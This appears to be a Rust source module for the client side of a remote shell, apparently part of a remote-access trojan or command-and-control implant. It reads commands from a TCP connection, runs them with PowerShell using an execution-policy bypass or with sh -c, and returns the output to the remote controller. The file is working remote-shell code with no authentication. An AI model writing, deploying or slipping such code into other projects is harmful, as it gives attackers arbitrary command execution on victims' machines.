use std::{net::TcpStream, process::Command};
use shared::{ClientMessage, ShellCommand, ShellOutput, utils::{read_message, send_message}};

fn handle_command(cmd: &str) -> Result<ShellOutput, String> {
    #[cfg(target_os = "windows")]
    let output = Command::new("powershell.exe")
        .args(["-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", cmd])
        .output();

    #[cfg(not(target_os = "windows"))]
    let output = Command::new("sh")
        .args(["-c", cmd])
        .output();

    match output {
        Ok(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout).to_string();
            let stderr = String::from_utf8_lossy(&out.stderr).to_string();
            let exit_code = out.status.code();

            Ok(ShellOutput { stderr, stdout, exit_code })
        }
        Err(e) => Err(format!("Failed to execute command: {}", e)),
    }
}

pub fn run(conn: &mut TcpStream) -> Result<bool, String> {
    loop {
        let msg: ShellCommand = match read_message(conn) {
            Ok(msg) => msg,
            Err(_) => break,
        };

        match msg {
            ShellCommand::Command(c) => {
                match handle_command(&c) {
                    Ok(out) => { 
                        let msg = ClientMessage::ShellOutput(out);
                        let _ = send_message(conn, &msg);
                    },
                    Err(e) => {
                        let msg = ClientMessage::Error(e);
                        let _ = send_message(conn, &msg); 
                    }
                }
            }

            ShellCommand::Close => break,
        }
    };

    Ok(true)
}